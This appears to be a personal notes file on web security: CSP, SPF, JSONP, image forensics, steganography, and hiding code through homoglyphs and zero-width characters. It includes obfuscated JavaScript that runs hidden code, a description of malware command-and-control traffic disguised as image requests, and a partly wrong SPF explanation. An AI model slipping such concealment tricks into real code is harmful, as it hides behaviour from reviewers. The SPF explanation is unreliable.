- [Cross-Origin Resource Sharing](https://www.w3.org/TR/cors/)
- [cors - What exactly does the Access-Control-Allow-Credentials header do? - Stack Overflow](https://stackoverflow.com/questions/24687313/what-exactly-does-the-access-control-allow-credentials-header-do/24689738#24689738)
- https://developer.mozilla.org/en-US/docs/Web/HTML/CORS_settings_attributes
- [Using CORS policies to implement CSRF protection | Mixmax Engineering Blog](https://mixmax.com/blog/modern-csrf)
- [the frontendian](https://frontendian.co/cors)
- [Do You Really Know CORS? – PerformantCode.com](http://performantcode.com/web/do-you-really-know-cors)

##### Content Security Policy

Aka CSP

**Note: URIs in directives sources can't contains `;` nor `,`**

Facebook CSP example:

```http
Content-Security-Policy: default-src * data: blob:;script-src *.facebook.com *.fbcdn.net *.facebook.net *.google-analytics.com *.virtualearth.net *.google.com 127.0.0.1:* *.spotilocal.com:* 'unsafe-inline' 'unsafe-eval' fbstatic-a.akamaihd.net fbcdn-static-b-a.akamaihd.net *.atlassolutions.com blob: data: chrome-extension://lifbcibllhkdhoafpjfnlhfpfgnpldfl;style-src * 'unsafe-inline' data:;connect-src *.facebook.com *.fbcdn.net *.facebook.net *.spotilocal.com:* *.akamaihd.net wss://*.facebook.com:* https://fb.scanandcleanlocal.com:* *.atlassolutions.com attachment.fbsbx.com ws://localhost:* blob: 127.0.0.1:*;
```

See also as example GitHub ultra strict CSP.

Exception of inline script and style can be made with `script-src` and `style-src` by using a checksum/hash of source code of inlined script. Note: nonce can also be used, but not recommended. See [Content Security Policy Level 2](https://www.w3.org/TR/CSP2/#script-src-hash-usage)

- [Subresource checksum](../Web/Web.md#subresource-checksum)
- [Content-Security-Policy - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- [Making CSP great again! - Michele Spagnuolo and Lukas Weichselbaum // Speaker Deck](https://speakerdeck.com/mikispag/making-csp-great-again-michele-spagnuolo-and-lukas-weichselbaum)
- [GitHub’s CSP journey - GitHub Engineering](https://githubengineering.com/githubs-csp-journey/)
- [GitHub’s post-CSP journey - GitHub Engineering](https://githubengineering.com/githubs-post-csp-journey/)
- [CSP Tester](https://jeffersonscher.com/res/csp-tester.php)
- [Content Security Policy Playground](http://www.cspplayground.com/home)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [Content Security Policy — Wikipedia](https://en.wikipedia.org/wiki/Content_Security_Policy)
- [Implementing Content Security Policy ★ Mozilla Hacks – the Web developer blog](https://hacks.mozilla.org/2016/02/implementing-content-security-policy/)
- [Content Security Policy CSP Reference & Examples](https://content-security-policy.com/)

#### SPF

Aka Sender Policy Framework, email authentication

Example:

```dns-zone
@ IN TXT "v=spf1 a include:_spf.google.com ~all
```

where:

- `a`: authorizes the host(s) identified in the domain's `A` record(s) to send e-mail
- `include:`: authorizes mail to be sent on behalf of the domain from `google.com`
- `~all`: denotes that this list is all inclusive, and no other servers are allowed to send e-mail

- [Sender Policy Framework - Wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework)
- [How To use an SPF Record to Prevent Spoofing &amp; Improve E-mail Reliability | DigitalOcean](https://www.digitalocean.com/community/tutorials/how-to-use-an-spf-record-to-prevent-spoofing-improve-e-mail-reliability)
- [RFC 4408 - Sender Policy Framework (SPF) for Authorizing Use of Domains in E-Mail, Version 1](https://tools.ietf.org/html/rfc4408)

#### JSONP

**Avoid using JSONP on sensitive domains. Use a dedicated sandbox domain.**

Use `X-Content-Type-Options: nosniff` and `Content-Type: application/javascript`. Return something like `/**/ typeof CALLBACK === "function" && CALLBACK(JSONP_RESPONSE);`, where `CALLBACK` is the callback name and `JSONP_RESPONSE` is the response

- [Abusing JSONP with Rosetta Flash](https://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/)

#### Image forensic

Find hidden data of faked data (ex: image):

- [FotoForensics](http://fotoforensics.com/)
- [Fool Me Once - The Hacker Factor Blog](http://www.hackerfactor.com/blog/?/archives/478-Fool-Me-Once.html)
- [bh-usa-07-krawetz-wp.pdf](https://www.hackerfactor.com/papers/bh-usa-07-krawetz-wp.pdf)
- [FotoForensics - FAQ](http://fotoforensics.com/faq.php?show=General&c=guidelines)
- [TinEye Reverse Image Search](https://www.tineye.com/)
- [Forensically, free online photo forensics tools - 29a.ch](https://29a.ch/photo-forensics/)
- [Ghiro - automated digital image forensics tool](http://www.getghiro.org/) - see https://github.com/ghirensics/ghiro
- [An Overview on Image Forensics](https://www.hindawi.com/journals/isrn/2013/496701/)

#### Hide data

Note: code is also data

**It's impossible to prevent access to data provided to untrusted parties, NEVER!** It's too late.

The reader / browser / VM must be able to read your files and since it has no idea of what encryption you use, you must "load" a encrypted file, and the algorithm of your encrypted file is in the loader. But what do you do with the loader itself then?

- encryption (AES / XOR / ROT…) on the value in memory
- encryption (AES / XOR / ROT…) on the packets
- Encrypted Files (code) in conjunction with super high code obfuscation of preloader.
- isolate code/class definition/context and checking for existing definition
- Memory Hacking Prevention, String & Binary Obfuscation, binary level obfuscation, key encrypting
- use different radix, etc.:
    
    ```
	"A" == "1000001" == "	     	"
    ```
    
    ```js
	// ascii string to whitespaces
	"Hello"
		.replace(/./g, function(w){return w.charCodeAt(0).toString(2).padStart(7, "0").replace(/0/g, ' ').replace(/1/g, "	")})
	// whitespaces to ascii string
	"	  	   		  	 			 		  		 		  		 				"
		.replace(/.{7}/g, function(w){return String.fromCharCode(parseInt(w.replace(/ /g, "0").replace(/	/g, "1"), 2))})
    ```
    
	See [javascript - Detect when "Inspect Element" is open - Stack Overflow](https://stackoverflow.com/questions/42193700/detect-when-inspect-element-is-open/42194142#comment71551031_42194142)

```as3
class Test {
	static function main() {
		var ldr:Dynamic = new flash.display.Loader();
		var ba:flash.utils.ByteArray = new flash.utils.ByteArray();
		for (i in Data.data) {
			ba.writeByte(i-1); // secret de-obfuscation algorithm: i - 1
		}
		ldr.loadBytes(ba);
		flash.Lib.current.addChild(ldr);
	}
}
```

Hidden text part can be recovered if short parts missing:
![DW19QBdWsAAPCJk.jpeg](./Data access and integrity/Prevent and detect violation/DW19QBdWsAAPCJk.jpg)
[Tom 7 on Twitter: "Redaction pro-tip: Most short word will have distinct length in a proportional font like Time New Roman. I think it' pretty clear, but decide for yourself...
(Thi i the Democratic "rebuttal" #memo unclassified today, page 3.)… https://t.co/eQvmiDwL1M"](https://twitter.com/tom7/status/967568358861430785)


##### Steganography

See also [Alternative data storage](#alternative-data-storage)

Hide data in data or metadata in a carrier format (image, video, etc.)

- append data at the end of file (or the begin, for format that support it)
	- easy detectable, file size
- hiding data in junk field
	- can be easily detectable for dedicated comment fields (or metadata)
	- add use larger fields (exemple: use 16bits palette instead of 8bits, give extra data)
- hidding data in LSB's (Least significant bit), minor offset values
	or Selected Least Significant Bit, LSB matching, etc.
	- doesn't impact file size
	
	- [Intensity Adaptive LSB Method Applying a Revised Matching - pxc3888468.pdf](http://research.ijcaonline.org/volume70/number27/pxc3888468.pdf)
- palette manipulation
	Reduce colors and duplocate palette entries, allow to create an other image by swapting palette
- encrypt before hide (reduce visual detection of LSB)
- spread hidden data over all bytes, not only in first bytes. Use a noise function to put interval between hidden data (Frequency space manipulation).
- don't hide in repeated data (image without enought contrasts, etc.)

- [stegosploit_pocgtfo8_submission](http://stegosploit.info/)
- SVG is a vector format, this allow to draw elements or vectorized texts in very small size to hide in in the image
- Corrumpt deliberately your files. Only you can restore it
	- [ImpulseAdventure - Fix Corrupt JPEG Photos!](http://www.impulseadventure.com/photo/fix-corrupt-jpeg-photo.html)
- Use unused colors in an image palette to encore data
	Limited to few bytes, max 256 colors = store data potential 765 Bytes max (255 * 24 bits)
- Recive C&C instructions by send HTTP request with absolute URI `GET http://example.com` to an IP address (which not related to the requested domain). Can send data by faking upload of a fake JPEG (only headers). [Dimnie: Hiding in Plain Sight](http://researchcenter.paloaltonetworks.com/2017/03/unit42-dimnie-hiding-plain-sight/)
	-> fake proxy recieve the HTTP request, response with a fake image contains instructions
	act as if it's was a regular HTTP traffic
- Store image / audio data in an audio / image format (lossy or lossless)
	Lossy can destroy too much information. Because audio and image/video codecs are adpated to human senses limitation ([auditory masking](https://en.wikipedia.org/wiki/Auditory_masking), chroma reduction: eye is less sensitive to fine color details than to fine brightness details, etc.)

	- [MP3 for Image Compression (2006) | Hacker News](https://news.ycombinator.com/item?id=14133221)
	- [Avian’s Blog: Lossy compression](https://www.tablix.org/~avian/blog/archives/2006/01/lossy_compression/)
	
    ```sh
	sox mo.wav -e unsigned -b 8 -c 1 -r 48k mo.raw
	bytes=`stat -f %z mo.raw`
	width=`echo sqrt\($bytes\) | bc`
	square_bytes=`echo $width \* $width | bc`
	dd if=mo.raw of=mo_square.raw bs=$square_bytes count=1
	gm convert -depth 8 -size ${width}x${width} gray:mo_square.raw -quality 50 mo_square.jpg
	gm convert mo_square.jpg gray:mo_square_jpg.raw
	sox -e unsigned -b 8 -c 1 -r 48k -t raw mo_square_jpg.raw mo_jpg.wav
    ```

- [Windowlicker — Wikipedia](https://en.wikipedia.org/wiki/Windowlicker)
- [wbStego Steganography Tool](http://wbstego.wbailer.com/)
- [Steganography — Wikipedia](https://en.wikipedia.org/wiki/Steganography)
- [Steghide](http://steghide.sourceforge.net/) - steganography program that hide data in JPEG, BMP, WAV and AU files
- [nullcon 2010 - Steganography & Stegananalysis: A Technical & Psycholo…](https://www.slideshare.net/null0x00/nullcon-2010-steganography-stegananalysis-a-technical-psychological-perspective)
- [» Secure Printing «](https://engineering.purdue.edu/~prints/publications.shtml) - Fingerprint / watermarks of printed or scanned documents
- [albinoloverats ~ stegfs](https://albinoloverats.net/projects/stegfs) - steganographic file system (use FUSE)
- [StegoShare — Wikipedia](https://en.wikipedia.org/wiki/StegoShare#Use_in_the_file_sharing_networks) - Use in the anonymous file sharing networks to transmit data
- [OpenPuff - Steganography & Watermarking](http://embeddedsw.net/OpenPuff_Steganography_Home.html) - steganography tool. See [OpenPuff — Wikipedia](https://en.wikipedia.org/wiki/OpenPuff)
- [ZEDZ.NET: purveyors of crypto since 1994.](http://zedz.net/) ftp://ftp.zedz.net/pub/security/steganography/ zedz.net/wiretapped.net Stenography examples (local copy in "zedz.net steganographic software")
- [owencm/js-steg: Javascript JPEG steganography library. Includes JS JPEG encoder and decoder with coefficient access helper functions.](https://github.com/owencm/js-steg)
- [Punk Ode: Hiding Shellcode in Plain Sight](https://www.blackhat.com/presentations/bh-usa-06/BH-US-06-Sutton.pdf)

###### Hide data in text

In document, user's comment, chat message, source code / script, source code's comment, source code variable name or value (strings), etc.

- using white spaces, lookalike chars substitution (confusable homoglyphs), diacritic, capitalization, unicode escape sequences and the differents way to encode it (ex. for HTML: `&#233;` vs `&#x00E9;` vs `&eacute;` vs `é`, etc. vs non escaped chars), surrogate pairs, etc.
	- https://github.com/reinderien/mimic and https://github.com/reinderien/mimic/wiki/Character-Set
	- [A tool can compress JavaScript code to any ascii image and still run normally](https://github.com/xinyu198736/js2image)
	- [Off-side rule — Wikipedia](https://en.wikipedia.org/wiki/Off-side_rule#Off-side_rule_languages)
	- [Whitespace (programming language) — Wikipedia](https://en.wikipedia.org/wiki/Whitespace_%28programming_language%29)
	- [Voidmaker - JSFiddle](https://jsfiddle.net/Lcjo35h4/1/)
	- [Homoglyph — Wikipedia](https://en.wikipedia.org/wiki/Homoglyph)
	- Ruby annotation are usally not visible
		> They tend not to have any rendering in fonts, since they’re control characters, and Unicode actually recommends they not be exposed directly to users at all, so there are no rules for how to actually display them
	
		`<ruby><rb>日本語</rb><rp>（</rp><rt>にほんご</rt><rp>）</rp></ruby>` `[U+FFF9]日本語[U+FFFA]にほんご[U+FFFB]`
	- Unicode decomposition `"한글" !== "한글"` `"ㅎㅏㄴ ㄱㅡㄹ"`
	- http://www.unicode.org/Public/security/latest/confusables.txt see [UTS #39: Unicode Security Mechanisms](http://www.unicode.org/reports/tr39/#confusables)
	- [vhf/confusable_homoglyphs: ϲοｎｆｕѕаｂｌе＿һοｍоɡｌｙｐｈｓ](https://github.com/vhf/confusable_homoglyphs)
	- replace some Latin characters with their Cyrillic doppelgänger ("aceijopsxy" -> "асеіјорѕху"), or Roman Numerals ("ⅰⅴⅹⅼⅽⅾⅿ" -> "ivxlcdm"):
        - [(1) Martin Kleppe on Twitter: "Evil note: In JavaScript you can replace some Latin characters with their Cyrillic doppelgänger ("aceijopsxy" =&gt; "асеіјорѕху") to use reserved words as your variable names such as: var vаr = function functіon(functіon){ cаtch = "me"; іf \[you = "can"\]; } vаr (breаk = true);" / Twitter](https://twitter.com/aemkei/status/1146884713371578369?s=12)
        
        ```js
        var vаr = function functіon(functіon){
          cаtch = "me"; 
          іf [you = "can"];
        }

        vаr (breаk = true);
        ```
        
        ```js
        dо='',vаr=!dо+dо,breаk=!vаr+dо,cаtch=dо+{},іf=vаr[dо++],ѕwitch=vаr[іn=dо],thiѕ=++іn+dо,cоnst=cаtch[іn+thiѕ],vаr[cоnst+=cаtch[dо]+(vаr.breаk+cаtch)[dо]+breаk[thiѕ]+іf+ѕwitch+vаr[іn]+cоnst+іf+cаtch[dо]+ѕwitch][cоnst](breаk[dо]+breаk[іn]+vаr[thiѕ]+ѕwitch+іf+"(dо)")()
        ```
        
        ```js
        [breаk,caѕe,cаtch,contіnue,dеbugger,defаult,dеlete,dо,elѕe,fіnally,fоr,functіon,іf,іn,inѕtanceof,nеw,rеturn,ѕwitch,thiѕ,thrоw,trу,typeоf,vаr,voіd,whіle,wіth] = "cyrillic doppelgänger of reserved words";
        ```
        
        ```js
        var сonst = "W";
        let vаr = "T";
        const lеt = "F";
        сonst + vаr + lеt // WTF
        ```
        
        ```js
        ([cοnst,cοnst,сοnst,сοnst,сοnst,сοnst]=[]+{},[сonst,cоnst,conѕt,соnst,сonѕt,сonѕt,cоnѕt,соnѕt,сοnѕt,сοnѕt,cοnѕt]=[!!cοnst]+!cοnst+cοnst.cοnst)[сοnst+=cοnst+cοnѕt+соnѕt+сonst+cоnst+conѕt+сοnst+сonst+cοnst+cоnst][сοnst](сonѕt+cоnѕt+соnst+cоnst+сonst+'("const")')()
        ```
- Zero width chars:

		<!-- [SmallestJS](http://schierlm.users.sourceforge.net/smallestjs.html) -->
		<!-- Use zero-width (invisible as text) chars: U+200D, U+FEFF, U+200C, U+200B -->
		<meta charset="UTF-8"><script>q="﻿‌‍​﻿‌​​﻿‌​‌﻿​‍​﻿​﻿‍﻿​‍‌﻿​﻿﻿﻿‌‍​﻿​﻿‍﻿‌​​﻿​‍‌﻿﻿​​‍​​﻿‍‌﻿​‍‍﻿﻿﻿﻿﻿​‍​​﻿﻿﻿​‍‍‌﻿​‍​​‍﻿‌​﻿﻿‍​‍﻿‌‍﻿‍﻿​​‍‍﻿​﻿‍​﻿﻿‌﻿‌‍‌​﻿‍​‌‍﻿​​​‍​​‍‍﻿﻿​﻿​‍﻿‍‍﻿​‍‌‍​‍‌‍‌‍​‌​﻿‌​‍‍​​﻿﻿​‍﻿‍‍‌​‍​‌​﻿​‍​‍‍﻿​﻿​​‍‍﻿‍‌﻿﻿‍﻿﻿‌​‍‍​‌​﻿‌‌﻿‍‌‌​‍​​﻿‍​﻿‍‍‌‌﻿‍﻿‍‍﻿​‌​﻿​﻿​‍‍﻿​‍﻿‍‌‍‍​‌﻿​﻿​‍‌‌​‍​​﻿‍‌‌‍﻿​‍﻿﻿‍﻿​‍‌‌​﻿‌‌‌‍‌‌﻿‍‌‌‌‍​﻿﻿‍‌​​‍​‍‌‍‌‌﻿‍‌﻿‌‍​‍​﻿​​﻿‍​‌​﻿​‍﻿‍‌‌​‍‍﻿‌‍﻿‍‍﻿​‍‍﻿‍‌​﻿​‍​﻿‌﻿﻿﻿‍‌﻿‍‌﻿‍‍‌‌‍﻿​﻿​‍‌​‍‍​﻿‍‍‌‌﻿‍‌‌﻿﻿​​﻿‍​‌​﻿‌‍​‍​​﻿﻿﻿‍‌‍‌​‍﻿‌​‍‍‌‌​‍​‍﻿‍​‍﻿‍﻿﻿‌﻿‌‍​﻿﻿‌​﻿‌‍​﻿﻿​﻿﻿﻿‌​﻿‌‍​﻿﻿​﻿‍‌‌‍﻿﻿‍‌‍‌‌​‍​‍﻿‍​‍﻿‍‌‌﻿‍‌‌﻿‍‌‌‍‍﻿﻿‌‍‌‍‍‍‌​​‍‌​​‍‌‍‍﻿‌‍‌﻿​‌﻿‍‌‍‍﻿‍‍‍‍﻿‍​‍‍​​‍﻿﻿​﻿﻿​‍‍‌﻿​‍​‌​‍‍﻿﻿﻿‌‍​‍‍﻿‍‍​​﻿﻿‌﻿‌﻿​﻿﻿﻿‌​‌﻿‌‍​﻿​﻿‍﻿‌‌﻿﻿﻿‍‍‍‌‌‍‍‌‌﻿‍‌‍‍﻿​‌​‍‍﻿﻿‍﻿​﻿﻿​‍‌‍‍﻿​﻿‌‍​﻿﻿‍‍‍﻿​﻿﻿​‍‌﻿​﻿﻿﻿‌‍​﻿​﻿‍﻿‌​​﻿​‍‌‍‌‍‌‍‌‌​‍‍‍‌‍﻿​‌‍‍‌‍‍​​​‍﻿‌﻿‍​‌​‍‍﻿﻿﻿‌​﻿﻿‌‍﻿﻿​‍‍‍‍﻿‌﻿﻿​​‍​﻿﻿‍‌​‍‍​﻿‌‍​﻿﻿‍​‍‌‍​﻿​‍​‌﻿‍‌​‍﻿﻿​​‍​﻿‍‍‌​‍﻿﻿​​‍​‍​‍﻿﻿‌‍‍﻿﻿‍﻿‍﻿‍‍﻿​‍﻿‍‌‍‍﻿﻿﻿﻿‍﻿‍﻿​﻿﻿​‍‌‍‍‌​‍​‌​﻿‌‌﻿‍‌‌​‍‌‌​‍‌‌﻿﻿​‌​‍‍﻿﻿﻿‌‍‌‍‍﻿​‍​‍‍‍​‍‍‍​‍‍‍​‍‍‍‌‍‌‍‌‌​‍﻿​﻿﻿​‍‌﻿‍﻿​‍‌‌﻿‍‌​‌﻿​﻿‍﻿‌​​﻿﻿‍​‍‍‌﻿‍‌‌‍‍​﻿‍‍﻿﻿‌‍﻿‍﻿‍‌‌​‍​​﻿﻿‌‍‌‍‌​‌﻿​​‍‍‌‌‍﻿‌‍‌‍‍‌​‍‌​﻿‍​﻿‍‍﻿﻿‌﻿​​﻿﻿‌‍‍‍‌‌‍‍‍﻿﻿‍‍​‌‍﻿‍﻿‍​​﻿‍﻿‍﻿‍‌‍﻿‍‌‍‌‍‌‌​﻿‌‌‌‍‌‌﻿‍‌​‌﻿‌‌‌﻿‌​​‍﻿​‌‍‌‌‍﻿‌​﻿﻿‌‍﻿﻿​‍‍﻿﻿‌​﻿‌‌‌﻿﻿​﻿‍﻿﻿‌﻿​​﻿‍‍‍‌﻿‌​​﻿‍​﻿‍‍‌‍‍​​​‍﻿‌﻿‍​​﻿﻿﻿﻿​‍‌‍﻿‍‌‍​‍​​​﻿‌‌‌﻿‌​​‍﻿​‌‍‌‌‍‍﻿‍﻿‍﻿﻿‌﻿​​﻿‍​‌​‍﻿‌‌﻿​﻿​﻿‍​‌‍﻿﻿﻿‍‌‌‍﻿﻿​‍‍‌﻿​‍​​‍﻿﻿‌‌﻿‌​﻿﻿‌​‍‍‍‍﻿﻿​​‌‍﻿​﻿﻿​‌﻿‍﻿​‍‍​​‌‍﻿‍‍﻿‌‍‌﻿﻿‌﻿﻿​‌﻿﻿​‌​﻿‌﻿‌﻿‌​​‍‌﻿‍‍‌​﻿﻿‌﻿‌﻿‌‍﻿﻿‌​﻿﻿‌‌﻿﻿‌​‍﻿​‌﻿‍​‌‌﻿﻿﻿‌﻿﻿​‌﻿‌﻿‍﻿‌‍﻿﻿‌​‌﻿‌‍﻿‍‌​‍﻿‍‍﻿﻿‍​‌﻿‌‍﻿﻿‌​‍‍‌​‍﻿‍‌‍﻿‌﻿﻿﻿‌​‍﻿​﻿‌﻿‍​‍﻿‌‌﻿﻿‌‍​﻿‌‍﻿‍‌​‍﻿​‍​﻿‌‍﻿﻿‌​‌﻿​‍​‍‌​﻿﻿​‍​﻿‌﻿﻿﻿‍​‌﻿‌﻿‌‍​‌​﻿​​﻿‍﻿‍‍‍‍‍​﻿​‌​﻿‌﻿‍﻿‌‌﻿﻿​‍​﻿​‍‍﻿‌​‍﻿‌‍﻿﻿​‌﻿‍​‌‌﻿‌‍‌﻿‌​‍﻿‌​​﻿‌‍​﻿‌‌​‍​‌​﻿​﻿​﻿‌‌﻿﻿‌﻿‍﻿​﻿‍﻿‌‌‍‍​‌‌‍​‌﻿‍​‍‍‍‌﻿﻿‍​‌​﻿‌‌‍﻿‌﻿﻿﻿‌‌﻿﻿‌﻿​﻿﻿‌‌‍​‌‌‍​‍‌‍​‍‍‍​‍‍﻿​‍‍﻿​‌‍‍​‌​﻿​​﻿‍﻿‍‍‍‍​​‍﻿​﻿﻿​‌﻿‍﻿​‍‍‍‍﻿﻿‌​﻿﻿‍​‍﻿‌‍﻿‍‌‍‍﻿﻿‌‌﻿​﻿‍﻿​‍‍‍‌​﻿﻿‌﻿﻿﻿​‍﻿﻿​﻿﻿﻿‌‌﻿﻿​﻿‌‍‍﻿​﻿‍‍​﻿﻿‍‍‍﻿﻿﻿‍‌﻿‍‍‌​﻿﻿﻿﻿‍﻿​‌﻿﻿​‍‍﻿‌﻿﻿‍‌‍‌‍‌‍‍﻿‌‍​﻿﻿‍‍‍﻿﻿﻿‍‌﻿‍‍‍﻿​‍﻿﻿﻿﻿​‌‍﻿​﻿‍‍‌​​﻿﻿‌‌﻿‌​﻿﻿‌​‍‍​‌​‍﻿​​‍​​﻿﻿‌‌﻿﻿​‍​﻿‌​​‍‌​﻿‍​‌‍‍​‌‍‍​﻿﻿‍​‌﻿‍‌​﻿‍​‍﻿‍‌‍‌‍‍‍﻿﻿​﻿‍﻿‌‌﻿﻿​﻿‍‍﻿​‍‍﻿﻿‍‍‍​​﻿​﻿‍﻿‌‌﻿﻿​﻿‍‍﻿​‍‍‍‍﻿‍‌​​﻿​​‌﻿‌‍‌﻿﻿‌﻿﻿​‌﻿‍‍‍﻿﻿‌‌‍‍​‍﻿‍﻿﻿‍‍‌‍‍‍‌​﻿‍‌‍‍﻿‍‍​‍‍﻿‍‍‌‍‍﻿‌﻿﻿﻿​﻿‌﻿﻿​‌﻿​‌﻿‍‌‍‍﻿‍‌‌﻿‌‍﻿﻿​﻿‌﻿‌‍﻿﻿​‌‌﻿﻿‌‍﻿‌​​‍‌‍‍﻿​‍​﻿‍﻿‍﻿‌‍​‍﻿‌‍﻿‌‍​﻿﻿‌﻿‍﻿‌‍﻿‌​‍﻿‌​​﻿‌​​﻿‌‌​‍﻿​‌﻿‌﻿​﻿﻿‌‍﻿‌‌‍‍﻿‌‍﻿​‍​﻿‌‍﻿﻿‌​﻿﻿‌﻿﻿‍‌​‌‍‌​‌‍‌​‌‍‍​​﻿‌‌‍‍​‍﻿﻿‍﻿‌‍​​‍﻿‌‌﻿‍​​‌﻿‌‍‌﻿​‌﻿‍‌‍‍﻿‌​﻿﻿‌‌﻿﻿‌‌‍﻿‌‌﻿‍‌‍‍‍‌﻿‌﻿‌​‍﻿​﻿‍‍​‌​﻿​‍​﻿‌‍​﻿‌‌‍﻿‌‌﻿﻿﻿​‌﻿‌​‍﻿‌​﻿‍‌‍‍﻿‌‍﻿﻿​﻿‍‍‌‍‍﻿​﻿﻿﻿​‍​﻿﻿​‌﻿​‍​‍‌‍‍﻿‌﻿‍﻿‌​​﻿​﻿‍‍‌‍‍﻿​‍​﻿‍﻿‍﻿‌‍​﻿‌﻿﻿﻿‌‍‍﻿‌﻿​‍﻿‌‍﻿‌﻿‍﻿‌​​﻿​﻿‍‍‌‍‍﻿‌​‌﻿‍​‍‍‌﻿‌﻿‌﻿​﻿​﻿‍‍​‌​‍‌​‍‍‌‍‍‍​​‍﻿‌‍﻿‍‌‍‍﻿‌‌‍﻿​‍‌﻿‌﻿﻿﻿‌﻿‌‍‍﻿​﻿﻿‌‌﻿​﻿‍﻿​‍‍‍​‌‌‍‌​​‍‌​​﻿​﻿‍﻿​﻿​﻿‌‌﻿﻿​﻿‍‍﻿﻿﻿﻿​‍‌‍‌​‌﻿‌‍​﻿‌​​﻿‌​﻿‍‌​​‍﻿‍​﻿​​​﻿‍‍‍‍﻿‍​‍‍​​﻿‌‍﻿‍​​‌‍‍​​﻿‌‌﻿‍​​‌‍‍​​﻿​‍‍﻿‍﻿‌﻿‍‌﻿﻿‌​‌‍‌‍‍﻿‌﻿‌﻿‌‍﻿﻿‌‍​﻿​﻿‍‍‌​‍‍‌‍‍﻿‌​​﻿‌﻿‌‍‌‍‍﻿‌‍​﻿‍﻿‍﻿​‍​‍﻿‌‍﻿​﻿​‍﻿‌‍﻿‍‌​‍﻿‌‍﻿​﻿﻿﻿​‍​‍﻿​‌﻿‌﻿​‍‌‍‍﻿​‍​﻿‌​​﻿‌​﻿‍﻿‌‍﻿﻿﻿﻿﻿‌​‌﻿‌‌﻿﻿‌‍​﻿﻿‌﻿‍﻿‌‍﻿​﻿‍﻿‍​‌﻿‌‍​﻿‌‌​﻿​‍​﻿﻿‌‍﻿‌​​‍‌‍‍﻿​‍‍﻿​﻿﻿﻿‌​‍﻿‌​‍‍‌‍‍﻿‌​​﻿‌﻿‌﻿﻿‌‍﻿‌‌‍﻿‌‌﻿﻿​‍​‍‌‍‍‍﻿​﻿﻿​﻿﻿‍‌﻿‍‍‌‍‍‍​‌‌‍‌‌﻿‍‍​​﻿​‍‍﻿‍﻿‌﻿​‌‌‍﻿‌​‍﻿​‌‍‍‌‍﻿​​​﻿‌‍﻿‍﻿​‍﻿​‍‌﻿​﻿‍‍‌‌‍‍​﻿‍‍​‍‌‍﻿﻿‌‍‌​​‍‌​​‍‍‌‍‍‌‍‍﻿​‌﻿﻿‍﻿‍‍‌‍‍﻿‍‌‌﻿﻿‍​‍‌‍‍﻿‌‌‍﻿﻿​‌﻿‌﻿﻿‍‍​​‍‍‍​‍‍‍﻿‍﻿​‌‍‍‌‍‍‌‍‍﻿‌‌﻿﻿‌﻿‍‍‍﻿​﻿‌﻿​﻿‌​​‍‌‍‌﻿﻿‌‍﻿​‌﻿﻿​‍‍﻿‌﻿﻿‍‍﻿​﻿‌‍‌﻿‍​﻿﻿​﻿‍﻿﻿‍‍‍‌‍‌‍‌‍‍‍﻿‌﻿‍‍﻿​﻿‍‍​‍‍﻿‍‍‌‍‌﻿‍﻿‌﻿‍​​﻿‍​﻿‍‍‌‍‍﻿‌​﻿‌​​﻿‍​﻿‍‍‌‍﻿​​​‍‍​​‍‍‍​‍​​‌﻿﻿​‍‍‌﻿​‍﻿﻿‌‍‍‍‌﻿‌﻿​﻿‌​​‍​​​﻿﻿‍‍﻿‌‍​﻿‌​‍﻿‌‌﻿﻿‌‍​﻿‌‌​‍​​﻿﻿‌‍​‍‍﻿‍‍​‌​﻿‌‍​‍‍﻿‍‍‌‌‍‍﻿﻿‌‍‍‍﻿‍​​‌‍﻿‍‍‍​​‍‍‍‍‌‍﻿‌‌﻿‌﻿​﻿‍​‍﻿‍﻿﻿‍﻿​‍﻿‌​﻿﻿‌﻿﻿‍‌﻿‍﻿‍‍‌﻿​‌﻿﻿‍‌﻿﻿‌﻿‍‍‌‌‍‍‌‍‌‍‍‍​‍﻿﻿﻿﻿​‌‍﻿​﻿‍﻿‍‌​﻿‌﻿﻿﻿‌‍﻿‍‍﻿‍﻿‌​​﻿‌​﻿﻿​‍‍‍﻿‍﻿﻿​‍​‍‍﻿﻿﻿​﻿‌﻿‍‌​‍‌‍‍‍‍﻿‌‍​​﻿﻿﻿‍​‍‍‌﻿‍‌​‌﻿‌﻿‌﻿​‍‌﻿‌​​﻿‌​﻿﻿‍‍​‍‍​‍‍‌‌‍‍‍﻿​‍​​﻿‍‌‍‌‍‍‌‍﻿​‍‍﻿‍​﻿‍‍‌﻿﻿​﻿‍﻿​‍‌‍﻿​‌﻿‌﻿​‍‍‌​‍‌​‌‍﻿​‍﻿‌​‌﻿‌﻿​﻿​﻿‍﻿‌‌‍‍‍​‍﻿‌‌‍﻿‍‌​﻿‍‍​﻿﻿‌﻿﻿‌﻿﻿‍‍​‌﻿‌‌‌‍​​﻿‍​‍‍‍​‌​﻿‌‌‌‍​​‍‍​﻿‍‍​‌​﻿‌‌‌‍‌‌​‍‌‌​‍‌‌﻿﻿​‌​‍‍​​‍​​‍‍‌​​‍﻿‍‍﻿﻿​‍﻿﻿​‍﻿‌​‌‍﻿‍﻿﻿​‍‌﻿‌﻿﻿﻿​‍​‍﻿‍‌‍‌‍‌‍​‌​﻿‌‍‍‍‌‌‍‍﻿‍​﻿‌​﻿﻿‌‌﻿﻿‌‌‍﻿‌‌﻿‍​﻿‍‍​‍‌‍﻿﻿‍‍​​‌﻿﻿‍​﻿‌​﻿﻿‌‍﻿﻿‌​‍‍﻿​‍‍﻿​﻿﻿‍‌‌﻿﻿‍​‍﻿﻿﻿﻿​﻿‍﻿‌﻿﻿‍﻿﻿‌‍‌‌﻿‍​‌​‍﻿﻿​﻿​‍​﻿‌‍​﻿​‍‌﻿﻿​‍‍‌﻿​‍‌‌​﻿﻿​‍‍‌﻿​﻿‌‌﻿﻿​‍‍﻿​﻿‍‍​​‌‍﻿‌‍﻿‌﻿﻿‍‌‍‍‍﻿‌﻿﻿​﻿‌﻿‌‍﻿﻿‌​‍﻿​﻿﻿﻿‌﻿﻿‍﻿‌‌﻿‌﻿‍﻿‌​​﻿‌‍​﻿​﻿﻿﻿‌​﻿﻿‌﻿﻿‍‌﻿‍‍‌​‌‍﻿‌​‍​‌‌‍‍​​﻿​‍‍‍‍‍﻿‍‍‍​‍‌‍‍﻿‌‌﻿﻿‌﻿‍‍‍﻿​‍﻿​‍﻿‌​‍﻿‌﻿﻿‍﻿​﻿﻿​‍​﻿​﻿‍‍﻿​‌﻿‌‌